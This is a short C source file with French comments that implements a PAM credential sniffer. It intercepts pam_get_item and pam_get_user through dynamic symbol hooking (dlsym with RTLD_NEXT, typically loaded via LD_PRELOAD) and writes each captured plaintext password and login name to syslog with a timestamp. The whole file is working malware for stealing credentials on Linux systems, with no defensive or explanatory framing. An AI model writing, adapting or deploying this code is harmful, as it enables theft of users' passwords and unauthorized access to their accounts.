#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#include <time.h>

// Fonction pour obtenir l'heure actuelle en tant que chaîne
const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Prototype pour pam_get_item et pam_get_user
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Intercepteur pour pam_get_item
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    static pam_get_item_t original_pam_get_item = NULL;

    // Charger la fonction originale
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_item : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    // Appeler la fonction originale
    int retval = original_pam_get_item(pamh, item_type, item);

    // Si on capture un mot de passe (PAM_AUTHTOK)
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        syslog(LOG_INFO, "[%s] Mot de passe capturé : %s", get_current_time(), (const char *)*item);
    }

    return retval;
}

// Intercepteur pour pam_get_user
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    static pam_get_user_t original_pam_get_user = NULL;

    // Charger la fonction originale
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_user : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    // Appeler la fonction originale
    int retval = original_pam_get_user(pamh, user, prompt);

    // Si le login est récupéré avec succès
    if (retval == PAM_SUCCESS && user && *user) {
        syslog(LOG_INFO, "[%s] Login capturé : %s", get_current_time(), *user);
    }

    return retval;
}

